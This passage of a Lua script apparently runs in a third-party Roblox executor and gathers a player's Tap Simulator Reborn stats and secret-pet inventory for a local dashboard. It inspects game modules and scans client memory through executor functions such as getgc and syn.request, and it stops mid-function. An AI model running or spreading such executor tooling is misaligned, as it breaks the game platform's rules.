--[[
===============================================================================
  TAP SIMULATOR REBORN – TRACKSTATS v2 CLIENT TELEMETRY REPORTER (READ-ONLY)
  Target Place ID: 72858262610964 | Universe ID: 10629695169
===============================================================================
  SAFETY & SCOPE:
    - Strictly READ-ONLY telemetry observer for your local TrackStats Dashboard.
    - ZERO gameplay automation (no auto-tap, no auto-hatch, no auto-rebirth).
    - ZERO credential/cookie reading and ZERO remote-event modification.
    - Includes an AFK Closed-Inventory Guard: closing your Pet UI omits
      `secretPets` instead of sending an empty array so your Secret Vault is
      never wiped, while hatch popups/chat still stream into `recentHatches`.
===============================================================================
]]

local SCRIPT_VERSION = "2.4.4"

local CONFIG = {
    ENDPOINT_URL = "http://127.0.0.1:3883/api/v1/telemetry",
    INSPECT_URL = "http://127.0.0.1:3883/api/v1/connector/inspect",
    LOADER_URL = "http://127.0.0.1:3883/loader.lua",
    API_KEY = "",
    SEND_INTERVAL = 2.0,
    INSPECT_ON_START = true,
    AUTO_RELOAD = true,
    DEBUG_LOG = false,

    -- Optional explicit dot-path overrides (populate using the Dashboard Connector Inspector tab
    -- if Tap Simulator Reborn changes UI or leaderstats names in a future update).
    -- Example: "PlayerGui.MainUI.Inventory.PetsFrame.ScrollingFrame"
    PATHS = {
        Taps = nil,
        TotalTaps = nil,
        Rebirths = nil,
        Wins = nil,
        Currency = nil,
        Eggs = nil,
        World = nil,
        PetListGui = nil,
        BoostListGui = nil,
    },
}

-- Merge executor runtime config from getgenv().TrackStats or _G.TrackStats
do
    local envTbl = (type(getgenv) == "function" and getgenv()) or _G
    local userCfg = (type(envTbl) == "table" and type(envTbl.TrackStats) == "table" and envTbl.TrackStats)
        or (type(_G.TrackStats) == "table" and _G.TrackStats)
        or {}

    local rawKey = userCfg.Key or userCfg.key or (type(envTbl) == "table" and envTbl.TrackStatsKey) or _G.TrackStatsKey
    if type(rawKey) == "string" and #rawKey > 0 then
        CONFIG.API_KEY = rawKey
    end
    local rawBase = userCfg.BaseUrl or userCfg.baseUrl
    if type(rawBase) == "string" and #rawBase > 0 then
        local cleanBase = rawBase:gsub("/+$", "")
        CONFIG.ENDPOINT_URL = cleanBase .. "/api/v1/telemetry"
        CONFIG.INSPECT_URL = cleanBase .. "/api/v1/connector/inspect"
    end
    local rawEp = userCfg.Endpoint or userCfg.endpoint
    if type(rawEp) == "string" and #rawEp > 0 then
        CONFIG.ENDPOINT_URL = rawEp
        CONFIG.INSPECT_URL = rawEp:gsub("/api/v1/telemetry/?$", "/api/v1/connector/inspect")
    end
    local rawInterval = tonumber(userCfg.Interval or userCfg.interval)
    if rawInterval and rawInterval >= 1.0 then
        CONFIG.SEND_INTERVAL = rawInterval
    end
    if type(userCfg.Inspect) == "boolean" then
        CONFIG.INSPECT_ON_START = userCfg.Inspect
    end
    if type(userCfg.Debug) == "boolean" then
        CONFIG.DEBUG_LOG = userCfg.Debug
    end
    if type(userCfg.Paths) == "table" then
        for k, v in pairs(userCfg.Paths) do
            CONFIG.PATHS[k] = v
        end
    end
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = pcall(function() return game:GetService("TeleportService") end) and game:GetService("TeleportService") or nil
local ReplicatedStorage = pcall(function() return game:GetService("ReplicatedStorage") end) and game:GetService("ReplicatedStorage") or nil
local TextChatService = pcall(function() return game:GetService("TextChatService") end) and game:GetService("TextChatService") or nil

local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
    warn("[TrackStats] LocalPlayer not available (run inside client context).")
    return
end

-- Singleton guard so re-executing cleanly stops any prior instance
local RUN_TOKEN = HttpService:GenerateGUID(false)
_G.__TapSimTrackStats_Token = RUN_TOKEN

local connections = {}
local pendingHatches = {}

local KNOWN_SECRETS = {
    ["30m candycorn dragon"] = { name = "30M Candycorn Dragon", tier = "Secret III", egg = "Secret Pool" },
    ["30m cursed gift"] = { name = "30M Cursed Gift", tier = "Secret I", egg = "Secret Pool" },
    ["30m imperfection"] = { name = "30M Imperfection", tier = "Secret III", egg = "Secret Pool" },
    ["30m vampire coffin"] = { name = "30M Vampire Coffin", tier = "Secret III", egg = "Secret Pool" },
    ["angelus"] = { name = "Angelus", tier = "Secret III", egg = "Secret Pool" },
    ["anubis"] = { name = "Anubis", tier = "Secret II", egg = "Secret Pool" },
    ["arch angel"] = { name = "Arch Angel", tier = "Secret III", egg = "Secret Pool" },
    ["autumn warden"] = { name = "Autumn Warden", tier = "Secret I", egg = "Pumpkin Egg" },
    ["bloodborne ruler"] = { name = "Bloodborne Ruler", tier = "Secret II", egg = "Secret Pool" },
    ["blue briar paladin"] = { name = "Blue Briar Paladin", tier = "Secret", egg = "Secret Pool" },
    ["blue briar palidin"] = { name = "Blue Briar Paladin", tier = "Secret", egg = "Secret Pool" },
    ["chronos"] = { name = "Chronos", tier = "Secret II", egg = "Chronos Egg" },
    ["chronus"] = { name = "Chronos", tier = "Secret II", egg = "Chronos Egg" },
    ["cinder eye"] = { name = "Cinder Eye", tier = "Secret I", egg = "Draconic Egg" },
    ["count batula"] = { name = "Count Batula", tier = "Secret II", egg = "Secret Pool" },
    ["crimson rose knight"] = { name = "Crimson Rose Knight", tier = "Secret", egg = "Secret Pool" },
    ["crystal guardian"] = { name = "Crystal Guardian", tier = "Secret I", egg = "Secret Pool" },
    ["crystalline colossus"] = { name = "Crystalline Colossus", tier = "Secret II", egg = "Secret Pool" },
    ["dark cat"] = { name = "Dark Cat", tier = "Secret III", egg = "Void Egg" },
    ["diamond piercer"] = { name = "Diamond Piercer", tier = "Secret I", egg = "Secret Pool" },
    ["dragon tamer"] = { name = "Dragon Tamer", tier = "Secret III", egg = "Draconic Egg" },
    ["enigma"] = { name = "Enigma", tier = "Secret", egg = "Secret Pool" },
    ["eternal emerald"] = { name = "Eternal Emerald", tier = "Secret II", egg = "Secret Pool" },
    ["first light"] = { name = "First Light", tier = "Secret", egg = "Secret Pool" },
    ["flame fungi"] = { name = "Flame Fungi", tier = "Secret I", egg = "Secret Pool" },
    ["forsaken knight"] = { name = "Forsaken Knight", tier = "Secret III", egg = "Void Egg" },
    ["frigidus"] = { name = "Frigidus", tier = "Secret II", egg = "Secret Pool" },
    ["frost behemoth"] = { name = "Frost Behemoth", tier = "Secret III", egg = "Secret Pool" },
    ["glacial dragon"] = { name = "Glacial Dragon", tier = "Secret I", egg = "Secret Pool" },
    ["hallow lord"] = { name = "Hallow Lord", tier = "Secret III", egg = "Secret Pool" },
    ["headless horseman"] = { name = "Headless Horseman", tier = "Secret II", egg = "Secret Pool" },
    ["helfire spirit"] = { name = "Helfire Spirit", tier = "Secret II", egg = "Volcanic Egg" },
    ["ice age specter"] = { name = "Ice Age Specter", tier = "Secret I", egg = "Secret Pool" },
    ["infernal lord"] = { name = "Infernal Lord", tier = "Secret II", egg = "Draconic Egg" },
    ["inferno dragon"] = { name = "Inferno Dragon", tier = "Secret I", egg = "Volcanic Egg" },
    ["king kraken"] = { name = "King Kraken", tier = "Secret", egg = "Secret Pool" },
    ["king of hell"] = { name = "King Of Hell", tier = "Secret III", egg = "Volcanic Egg" },
    ["king shroomie"] = { name = "King Shroomie", tier = "Secret II", egg = "Secret Pool" },
    ["malevolent treat"] = { name = "Malevolent Treat", tier = "Secret III", egg = "Pumpkin Egg" },
    ["nameless deity"] = { name = "Nameless Deity", tier = "Secret II", egg = "Secret Pool" },
    ["nameless diety"] = { name = "Nameless Deity", tier = "Secret II", egg = "Secret Pool" },
    ["neon cat"] = { name = "Neon Cat", tier = "Secret", egg = "Secret Pool" },
    ["nevermore"] = { name = "Nevermore", tier = "Secret III", egg = "Secret Pool" },
    ["oasis spirit"] = { name = "Oasis Spirit", tier = "Secret I", egg = "Cactus Egg" },
    ["oaisis spirit"] = { name = "Oasis Spirit", tier = "Secret I", egg = "Cactus Egg" },
    ["operating system"] = { name = "Operating System", tier = "Secret I", egg = "Secret Pool" },
    ["operating system evo"] = { name = "Operating System Evo", tier = "Secret II", egg = "Secret Pool" },
    ["operating system evo 2"] = { name = "Operating System Evo 2", tier = "Secret III", egg = "Secret Pool" },
    ["operating system obliterated"] = { name = "Operating System OBLITERATED", tier = "Secret", egg = "Secret Pool" },
    ["orca dominator"] = { name = "Orca Dominator", tier = "Secret II", egg = "Secret Pool" },
    ["peace keeper"] = { name = "Peace Keeper", tier = "Secret III", egg = "Celestial Egg" },
    ["phantom mirror"] = { name = "Phantom Mirror", tier = "Secret II", egg = "Secret Pool" },
    ["prestige"] = { name = "Prestige", tier = "Secret", egg = "Secret Pool" },
    ["reanimation"] = { name = "Reanimation", tier = "Secret", egg = "Secret Pool" },
    ["release trophy"] = { name = "Release Trophy", tier = "Secret III", egg = "Secret Pool" },
    ["riftshard"] = { name = "Riftshard", tier = "Leaderboard", egg = "Secret Pool" },
    ["royal crown"] = { name = "Royal Crown", tier = "Secret", egg = "Secret Pool" },
    ["sand sovereign"] = { name = "Sand Sovereign", tier = "Secret II", egg = "Secret Pool" },
    ["sanguine heart"] = { name = "Sanguine Heart", tier = "Secret III", egg = "Crimson Egg" },
    ["sharkie"] = { name = "Sharkie", tier = "Secret I", egg = "Secret Pool" },
    ["shinigami"] = { name = "Shinigami", tier = "Secret II", egg = "Void Egg" },
    ["soul hunter"] = { name = "Soul Hunter", tier = "Secret II", egg = "Secret Pool" },
    ["the flying dutchman"] = { name = "The Flying Dutchman", tier = "Secret II", egg = "Secret Pool" },
    ["time paradox"] = { name = "Time Paradox", tier = "Secret III", egg = "Chronos Egg" },
    ["tyrannosaurus rex"] = { name = "Tyrannosaurus Rex", tier = "Secret I", egg = "Secret Pool" },
    ["vanguard"] = { name = "Vanguard", tier = "Secret", egg = "Secret Pool" },
    ["void overseer"] = { name = "Void Overseer", tier = "Secret II", egg = "Void Egg" },
    ["void wraith"] = { name = "Void Wraith", tier = "Secret I", egg = "Void Egg" },
    ["winged cursed captain"] = { name = "Winged Cursed Captain", tier = "Secret II", egg = "Secret Pool" },
    ["witch beast"] = { name = "Witch Beast", tier = "Limited", egg = "Secret Pool" },
    ["witches hat"] = { name = "Witches Hat", tier = "Secret II", egg = "Secret Pool" },
}

local function logDebug(msg)
    if CONFIG.DEBUG_LOG then
        print("[TrackStats] " .. tostring(msg))
    end
end

-- Multi-environment HTTP POST wrapper
local function getHttpRequestFn()
    if type(request) == "function" then
        return request
    end
    if type(http_request) == "function" then
        return http_request
    end
    if type(syn) == "table" and type(syn.request) == "function" then
        return syn.request
    end
    if type(fluxus) == "table" and type(fluxus.request) == "function" then
        return fluxus.request
    end
    if type(http) == "table" and type(http.request) == "function" then
        return http.request
    end
    return nil
end

local lastAuthWarnAt = 0

local function postJson(url, tableBody)
    local encoded = HttpService:JSONEncode(tableBody)
    local headers = { ["Content-Type"] = "application/json" }
    if type(CONFIG.API_KEY) == "string" and #CONFIG.API_KEY > 0 then
        headers["X-TrackStats-Key"] = CONFIG.API_KEY
    end

    local function checkResp(ok, resp)
        if ok and type(resp) == "table" then
            local code = tonumber(resp.StatusCode or resp.Status)
            if (code == 401 or code == 403) and (os.time() - lastAuthWarnAt >= 15) then
                lastAuthWarnAt = os.time()
                warn("[TrackStats] HTTP " .. tostring(code) .. " Unauthorized — set getgenv().TrackStats = { Key = \"YOUR_KEY\" } before loading!")
            end
        end
    end

    local reqFn = getHttpRequestFn()
    if reqFn then
        local ok, resp = pcall(reqFn, {
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = encoded,
        })
        checkResp(ok, resp)
        return ok, resp
    end
    -- Fallback for Roblox Studio HttpService testing
    local ok, resp = pcall(function()
        return HttpService:RequestAsync({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = encoded,
        })
    end)
    checkResp(ok, resp)
    return ok, resp
end

-- Parses compact simulator numbers like "1.54M", "48.2B", "x25,000", "2.5Qa"
local SUFFIX_MULT = {
    k = 1e3,
    m = 1e6,
    b = 1e9,
    t = 1e12,
    qa = 1e15,
    qi = 1e18,
    sx = 1e21,
    sp = 1e24,
    oc = 1e27,
    no = 1e30,
    dc = 1e33,
}

local function parseCompactNumber(raw)
    if type(raw) == "number" then
        return raw
    end
    if type(raw) ~= "string" then
        return 0
    end
    local cleaned = raw:gsub(",", ""):gsub("%s+", ""):gsub("^[xX%+]", "")
    local numStr, suffix = cleaned:match("([%d%.]+)([a-zA-Z]*)")
    if not numStr then
        return 0
    end
    local val = tonumber(numStr) or 0
    if suffix and suffix ~= "" then
        local mult = SUFFIX_MULT[suffix:lower()]
        if mult then
            val = val * mult
        end
    end
    return math.floor(val + 0.5)
end

local function parseFloatCompact(raw)
    if type(raw) == "number" then
        return raw
    end
    if type(raw) ~= "string" then
        return 0
    end
    local cleaned = raw:gsub(",", ""):gsub("%s+", ""):gsub("^[xX%+]", "")
    local numStr, suffix = cleaned:match("([%d%.]+)([a-zA-Z]*)")
    if not numStr then
        return 0
    end
    local val = tonumber(numStr) or 0
    if suffix and suffix ~= "" then
        local mult = SUFFIX_MULT[suffix:lower()]
        if mult then
            val = val * mult
        end
    end
    return val
end

local function extractAssetId(imageStr)
    if type(imageStr) == "number" and imageStr > 0 then
        return imageStr
    end
    if type(imageStr) ~= "string" then
        return nil
    end
    local id = imageStr:match("rbxassetid://(%d+)")
        or imageStr:match("[?&]id=(%d+)")
        or imageStr:match("^(%d+)$")
    return id and tonumber(id) or nil
end

local function resolvePath(pathStr)
    if type(pathStr) ~= "string" or pathStr == "" then
        return nil
    end
    local current = LocalPlayer
    for segment in pathStr:gmatch("[^%.]+") do
        if segment == "LocalPlayer" then
            current = LocalPlayer
        elseif segment == "game" then
            current = game
        elseif current then
            current = current:FindFirstChild(segment)
        end
    end
    return current
end

local function readInstanceNumber(inst)
    if not inst then
        return nil
    end
    if inst:IsA("ValueBase") then
        return parseCompactNumber(inst.Value)
    end
    if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then
        return parseCompactNumber(inst.Text)
    end
    return nil
end

local function isGuiActuallyVisible(inst)
    local cur = inst
    while cur and cur ~= game do
        if cur:IsA("ScreenGui") and not cur.Enabled then
            return false
        end
        if cur:IsA("GuiObject") and not cur.Visible then
            return false
        end
        cur = cur.Parent
    end
    return true
end

local function detectVariant(text)
    local lower = (text or ""):lower()
    local isShiny = lower:find("shiny", 1, true) ~= nil
    if lower:find("rainbow", 1, true) then
        return isShiny and "Rainbow Shiny" or "Rainbow"
    elseif lower:find("diamond", 1, true) then
        return isShiny and "Diamond Shiny" or "Diamond"
    elseif lower:find("golden", 1, true) or lower:find("gold", 1, true) then
        return isShiny and "Golden Shiny" or "Golden"
    elseif isShiny then
        return "Shiny"
    end
    return "Normal"
end

local function detectTier(text)
    local lower = (text or ""):lower()
    if lower:find("secret iii", 1, true) or lower:find("secret 3", 1, true) then
        return "Secret III"
    elseif lower:find("secret ii", 1, true) or lower:find("secret 2", 1, true) then
        return "Secret II"
    elseif lower:find("secret i", 1, true) or lower:find("secret 1", 1, true) then
        return "Secret I"
    elseif lower:find("event", 1, true) then
        return "Event"
    end
    return nil
end

-- Collects core stats from CONFIG.PATHS -> leaderstats -> Attributes -> HUD labels
local function collectCoreStats()
    local stats = {
        currentTaps = 0,
        totalTaps = 0,
        currentRebirths = 0,
        totalRebirths = 0,
        currentWins = 0,
        totalWins = 0,
        currentCurrency = 0,
        eggsHatched = 0,
        world = nil,
    }

    local aliasMap = {
        { field = "currentTaps", keys = { "taps", "clicks", "tap", "currenttaps" } },
        { field = "totalTaps", keys = { "totaltaps", "totalclicks", "lifetimetaps" } },
        { field = "currentRebirths", keys = { "rebirths", "rebirth" } },
        { field = "currentWins", keys = { "wins", "win" } },
        { field = "currentCurrency", keys = { "gems", "coins", "currency", "tokens", "diamonds" } },
        { field = "eggsHatched", keys = { "eggs", "eggshatched", "hatches", "hatched" } },
    }

    local function applyKeyValue(k, v)
        local lk = tostring(k):lower():gsub("[%s_%-]", "")
        if lk == "world" or lk == "island" or lk == "zone" or lk == "area" then
            if type(v) == "string" and v ~= "" then
                stats.world = v
            end
            return
        end
        for _, entry in ipairs(aliasMap) do
            for _, alias in ipairs(entry.keys) do
                if lk == alias then
                    local num = parseCompactNumber(v)
                    if num > 0 or stats[entry.field] == 0 then
                        stats[entry.field] = num
                    end
                    return
                end
            end
        end
    end

    -- 1. leaderstats
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if ls then
        for _, child in ipairs(ls:GetChildren()) do
            if child:IsA("ValueBase") then
                applyKeyValue(child.Name, child.Value)
            end
        end
    end

    -- 2. Player Attributes
    local okAttrs, attrs = pcall(function() return LocalPlayer:GetAttributes() end)
    if okAttrs and type(attrs) == "table" then
        for k, v in pairs(attrs) do
            applyKeyValue(k, v)
        end
    end

    -- 3. Explicit CONFIG.PATHS overrides (highest priority)
    local pathOverrides = {
        currentTaps = CONFIG.PATHS.Taps,
        totalTaps = CONFIG.PATHS.TotalTaps,
        currentRebirths = CONFIG.PATHS.Rebirths,
        currentWins = CONFIG.PATHS.Wins,
        currentCurrency = CONFIG.PATHS.Currency,
        eggsHatched = CONFIG.PATHS.Eggs,
    }
    for field, pStr in pairs(pathOverrides) do
        if pStr then
            local val = readInstanceNumber(resolvePath(pStr))
            if val ~= nil then
                stats[field] = val
            end
        end
    end
    if CONFIG.PATHS.World then
        local wInst = resolvePath(CONFIG.PATHS.World)
        if wInst then
            if wInst:IsA("ValueBase") then
                stats.world = tostring(wInst.Value)
            elseif wInst:IsA("TextLabel") then
                stats.world = wInst.Text
            end
        end
    end

    if stats.totalTaps < stats.currentTaps then
        stats.totalTaps = stats.currentTaps
    end
    stats.totalRebirths = stats.currentRebirths
    stats.totalWins = stats.currentWins
    return stats
end

-- Bogus UI words that must NEVER be treated as Secret pet names
local BOGUS_PET_NAMES = {
    [""] = true,
    ["yet"] = true,
    ["unknown"] = true,
    ["unknown secret"] = true,
    ["unknown pet"] = true,
    ["secret"] = true,
    ["secrets"] = true,
    ["secret pet"] = true,
    ["secret pets"] = true,
    ["secret pool"] = true,
    ["secret skip"] = true,
    ["secret luck"] = true,
    ["skip"] = true,
    ["luck"] = true,
    ["none"] = true,
    ["null"] = true,
    ["nil"] = true,
    ["auto"] = true,
    ["default"] = true,
    ["template"] = true,
    ["sample"] = true,
    ["placeholder"] = true,
    ["empty"] = true,
    ["hatched"] = true,
}

local function normalizeLookupKey(str)
    if type(str) ~= "string" then
        return ""
    end
    return str:lower():gsub("^%s+", ""):gsub("%s+$", "")
end

local function compactKey(str)
    if type(str) ~= "string" then
        return ""
    end
    return str:lower():gsub("[^a-z0-9]", "")
end

local function isBogusPetName(raw)
    if type(raw) ~= "string" then
        return true
    end
    local clean = normalizeLookupKey(raw)
    if clean == "" or #clean <= 2 or BOGUS_PET_NAMES[clean] then
        return true
    end
    if clean:find("haven't hatched", 1, true)
        or clean:find("havent hatched", 1, true)
        or clean:find("no secret", 1, true)
        or clean:match("%s+yet!?$") then
        return true
    end
    return false
end

-- Dynamic Game Pet Database & AssetId->Pet map (populated from KNOWN_SECRETS + ReplicatedStorage + SpriteHolder + getgc)
local GAME_PET_DB = {}
local COMPACT_SECRETS = {}
local ASSET_TO_SECRET = {}

local function registerKnownPet(keyOrName, info)
    if type(keyOrName) ~= "string" or type(info) ~= "table" or not info.name then
        return
    end
    local lk = normalizeLookupKey(keyOrName)
    local ck = compactKey(keyOrName)
    if lk ~= "" and not BOGUS_PET_NAMES[lk] then
        GAME_PET_DB[lk] = info
    end
    if ck ~= "" and not BOGUS_PET_NAMES[ck] then
        COMPACT_SECRETS[ck] = info
    end
    if info.imageAssetId then
        ASSET_TO_SECRET[tostring(info.imageAssetId)] = info
    end
end

for k, info in pairs(KNOWN_SECRETS) do
    registerKnownPet(k, info)
    registerKnownPet(info.name, info)
end

local STRIP_VARIANT_WORDS = { "golden ", "gold ", "rainbow ", "diamond ", "shiny ", "normal ", "secret " }

local function matchKnownSecret(rawText, assetId)
    if assetId and ASSET_TO_SECRET[tostring(assetId)] then
        return ASSET_TO_SECRET[tostring(assetId)]
    end
    if type(rawText) ~= "string" or rawText == "" then
        return nil
    end
    local lower = normalizeLookupKey(rawText)
    if GAME_PET_DB[lower] then
        return GAME_PET_DB[lower]
    end
    local ck = compactKey(rawText)
    if COMPACT_SECRETS[ck] then
        return COMPACT_SECRETS[ck]
    end
    -- Strip leading variant prefixes like "Golden Dark Cat" or "[Secret] Dark Cat"
    local stripped = lower:gsub("^%[[^%]]+%]%s*", ""):gsub("^%([^%)]+%)%s*", "")
    for _, pref in ipairs(STRIP_VARIANT_WORDS) do
        if stripped:sub(1, #pref) == pref then
            stripped = stripped:sub(#pref + 1)
        end
    end
    if GAME_PET_DB[stripped] then
        return GAME_PET_DB[stripped]
    end
    local sck = compactKey(stripped)
    if COMPACT_SECRETS[sck] then
        return COMPACT_SECRETS[sck]
    end
    -- Substring search for longest matching known secret key
    local bestMatch = nil
    local bestLen = 0
    for key, info in pairs(KNOWN_SECRETS) do
        if #key > bestLen and lower:find(key, 1, true) then
            bestMatch = info
            bestLen = #key
        end
    end
    return bestMatch
end

local function safeRequire(mod)
    if not mod or not mod:IsA("ModuleScript") then
        return nil
    end
    local done = false
    local ok, res = false, nil
    task.spawn(function()
        ok, res = pcall(require, mod)
        done = true
    end)
    local waited = 0
    while not done and waited < 0.25 do
        task.wait(0.02)
        waited = waited + 0.02
    end
    if done and ok then
        return res
    end
    return nil
end

local function getPlayerDataReplica()
    if not ReplicatedStorage then
        return nil
    end
    local controllers = ReplicatedStorage:FindFirstChild("Controllers")
    local core = controllers and controllers:FindFirstChild("Core")
    if not core then
        return nil
    end
    local dataCtrl = safeRequire(core:FindFirstChild("DataController"))
    if type(dataCtrl) == "table" and type(dataCtrl.GetReplica) == "function" then
        local ok, rep = pcall(function() return dataCtrl:GetReplica() end)
        if not ok or type(rep) ~= "table" then
            ok, rep = pcall(function() return dataCtrl.GetReplica() end)
        end
        if ok and type(rep) == "table" and type(rep.Data) == "table" then
            return rep.Data
        end
    end
    local repCtrl = safeRequire(core:FindFirstChild("ReplicaController"))
    if type(repCtrl) == "table" and type(repCtrl._replicas) == "table" then
        for _, rep in pairs(repCtrl._replicas) do
            if type(rep) == "table" and type(rep.Data) == "table" then
                if rep.Class == "PlayerData" or rep.Data.Pets ~= nil or rep.Data.Rebirths ~= nil or rep.Data.Clicks ~= nil then
                    return rep.Data
                end
            end
        end
    end
    return nil
end

local lastCatalogScanAt = 0

local function discoverGamePetCatalog()
    if os.time() - lastCatalogScanAt < 30 then
        return
    end
    lastCatalogScanAt = os.time()

    -- 0. Read authoritative OriginalPetCatalog & LaunchEggConfig from ReplicatedStorage.Shared.Pets
    if ReplicatedStorage then
        pcall(function()
            local shared = ReplicatedStorage:FindFirstChild("Shared")
            local sharedPets = shared and shared:FindFirstChild("Pets")
            if sharedPets then
                local petToEgg = {}
                local eggCfg = safeRequire(sharedPets:FindFirstChild("LaunchEggConfig"))
                if type(eggCfg) == "table" then
                    for eggName, eggData in pairs(eggCfg) do
                        if type(eggData) == "table" and type(eggData.Secrets) == "table" then
                            for sk, sv in pairs(eggData.Secrets) do
                                local sName = (type(sv) == "table" and (sv.Name or sv.Pet or sv[1])) or (type(sv) == "string" and sv) or (type(sk) == "string" and sk)
                                if type(sName) == "string" then
                                    petToEgg[sName:lower()] = tostring(eggName)
                                end
                            end
                        end
                    end
                end

                for _, modName in ipairs({ "OriginalPetCatalog", "PetCatalog" }) do
                    local catTbl = safeRequire(sharedPets:FindFirstChild(modName))
                    if type(catTbl) == "table" then
                        for petKey, def in pairs(catTbl) do
                            if type(def) == "table" then
                                local pName = tostring(def.Name or def.DisplayName or petKey)
                                local rarity = tostring(def.Rarity or def.Tier or "")
                                local rLower = rarity:lower()
                                local imgId = extractAssetId(def.Image or def.Icon)
                                local goldImgId = extractAssetId(def.Image_Golden)
                                local mult = tonumber(def.Multiplier1 or def.Multiplier2 or def.Multiplier) or 1
                                local known = KNOWN_SECRETS[pName:lower()]
                                local isSec = (known ~= nil)
                                    or (rLower:find("secret", 1, true) ~= nil)
                                    or (rLower == "leaderboard")
                                    or (rLower == "exclusive" and def.Huge == true)
                                if isSec and not isBogusPetName(pName) then
                                    local info = {
                                        name = pName,
                                        tier = (rarity ~= "" and rarity) or (known and known.tier) or "Secret",
                                        egg = petToEgg[pName:lower()] or (known and known.egg) or "Secret Pool",
                                        imageAssetId = imgId or (known and known.imageAssetId),
                                        goldenAssetId = goldImgId,
                                        multiplier = (mult and mult > 1) and mult or (known and known.multiplier) or 1,
                                        isSecret = true,
                                    }
                                    registerKnownPet(pName, info)
                                    registerKnownPet(tostring(petKey), info)
                                end
                            end
                        end
                    end
                end
            end
        end)
    end

    -- 1. Scan ReplicatedStorage folders/models/attributes for pet definitions
    if ReplicatedStorage then
        pcall(function()
            for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
                if desc:IsA("Folder") or desc:IsA("Model") or desc:IsA("Configuration") then
                    local okA, attrs = pcall(function() return desc:GetAttributes() end)
                    if okA and type(attrs) == "table" then
                        local rarity = tostring(attrs.Rarity or attrs.rarity or attrs.Tier or attrs.tier or "")
                        local img = extractAssetId(attrs.Image or attrs.image or attrs.Icon or attrs.icon or attrs.AssetId)
                        local mult = parseFloatCompact(attrs.Multiplier or attrs.multiplier or attrs.Power or attrs.power)
                        local known = matchKnownSecret(desc.Name, img)
                        if known or rarity:lower():find("secret", 1, true) then
                            local info = {
                                name = (known and known.name) or tostring(attrs.DisplayName or attrs.Name or desc.Name),
                                tier = (known and known.tier) or (rarity ~= "" and rarity) or "Secret",
                                egg = (known and known.egg) or attrs.Egg or attrs.egg,
                                imageAssetId = img or (known and known.imageAssetId),
                                multiplier = (mult and mult > 1) and mult or (known and known.multiplier),
                            }
                            registerKnownPet(desc.Name, info)
                            registerKnownPet(info.name, info)
                        end
                    end
                end
            end
        end)
    end

    -- 2. Scan PlayerGui.SpriteHolder for preloaded pet icons
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    local spriteHolder = pg and pg:FindFirstChild("SpriteHolder")
    if spriteHolder then
        pcall(function()
            for _, desc in ipairs(spriteHolder:GetDescendants()) do
                if (desc:IsA("ImageLabel") or desc:IsA("ImageButton")) and desc.Image ~= "" then
                    local assetId = extractAssetId(desc.Image)
                    local candidateName = (desc.Name ~= "Icon" and desc.Name ~= "Image") and desc.Name
                        or (desc.Parent and desc.Parent.Name) or ""
                    local known = matchKnownSecret(candidateName, assetId)
                    if known and assetId then
                        known.imageAssetId = known.imageAssetId or assetId
                        registerKnownPet(candidateName, known)
                    end
                end
            end
        end)
    end

    -- 3. Scan getgc(true) for static Pet Catalog definition tables (fast rawget filter)
    if type(getgc) == "function" then
        pcall(function()
            local objs = getgc(true)
            for _, tbl in ipairs(objs) do
                if type(tbl) == "table" then
                    -- Fast O(1) probe: only iterate tables that look like a pet definition or pet dictionary
                    local probeRarity = rawget(tbl, "Rarity") or rawget(tbl, "rarity")
                    local probeName = rawget(tbl, "Name") or rawget(tbl, "name") or rawget(tbl, "DisplayName")
                    if probeRarity and type(probeName) == "string" then
                        local rawRarity = tostring(probeRarity)
                        local rawImg = extractAssetId(rawget(tbl, "Image") or rawget(tbl, "image") or rawget(tbl, "Icon") or rawget(tbl, "icon") or rawget(tbl, "Thumbnail") or rawget(tbl, "AssetId"))
                        local known = matchKnownSecret(probeName, rawImg)
                        if known or rawRarity:lower():find("secret", 1, true) then
                            local finalName = (known and known.name) or (not isBogusPetName(probeName) and probeName) or nil
                            if finalName then
                                local mult = parseFloatCompact(rawget(tbl, "Multiplier") or rawget(tbl, "multiplier") or rawget(tbl, "Power") or rawget(tbl, "power"))
                                local info = {
                                    name = finalName,
                                    tier = detectTier(rawRarity) or (known and known.tier) or "Secret",
                                    egg = rawget(tbl, "Egg") or rawget(tbl, "egg") or (known and known.egg),
                                    imageAssetId = rawImg or (known and known.imageAssetId),
                                    multiplier = (mult and mult > 1) and mult or (known and known.multiplier),
                                }
                                registerKnownPet(finalName, info)
                                local rawId = rawget(tbl, "Id") or rawget(tbl, "id")
                                if type(rawId) == "string" or type(rawId) == "number" then
                                    registerKnownPet(tostring(rawId), info)
                                end
                            end
                        end
                    end
                end
            end
        end)
    end
end

-- Helper to detect Variant from a Lua pet instance table
local function detectVariantFromTable(petTbl, fallbackStr)
    if type(petTbl) == "table" then
        local explicit = rawget(petTbl, "Variant") or rawget(petTbl, "variant") or rawget(petTbl, "Mutation") or rawget(petTbl, "Evolution") or rawget(petTbl, "Type")
        local isShiny = (rawget(petTbl, "Shiny") == true) or (rawget(petTbl, "shiny") == true) or (rawget(petTbl, "IsShiny") == true)
        local isRainbow = (rawget(petTbl, "Rainbow") == true) or (rawget(petTbl, "rainbow") == true)
        local isGolden = (rawget(petTbl, "Golden") == true) or (rawget(petTbl, "golden") == true) or (rawget(petTbl, "Gold") == true)
        local isDiamond = (rawget(petTbl, "Diamond") == true) or (rawget(petTbl, "diamond") == true)
        local tierNum = tonumber(rawget(petTbl, "Tier") or rawget(petTbl, "tier") or rawget(petTbl, "Grade") or rawget(petTbl, "Evo"))
        if isRainbow or tierNum == 3 then
            return isShiny and "Rainbow Shiny" or "Rainbow"
        elseif isDiamond or tierNum == 4 then
            return isShiny and "Diamond Shiny" or "Diamond"
        elseif isGolden or tierNum == 2 then
            return isShiny and "Golden Shiny" or "Golden"
        elseif type(explicit) == "string" and explicit ~= "" then
            return detectVariant(explicit .. (isShiny and " Shiny" or ""))
        elseif isShiny then
            return "Shiny"
        end
    end
    return detectVariant(fallbackStr or "")
end

-- Strategy 1: Read player's owned Pet Inventory directly from TS2 DataController:GetReplica() & InventoryController:GetStacks()!
local function collectPetsFromGc()
    local aggregatedSecrets = {}
    local equippedList = {}
    local invCount = 0
    local totalPower = 0
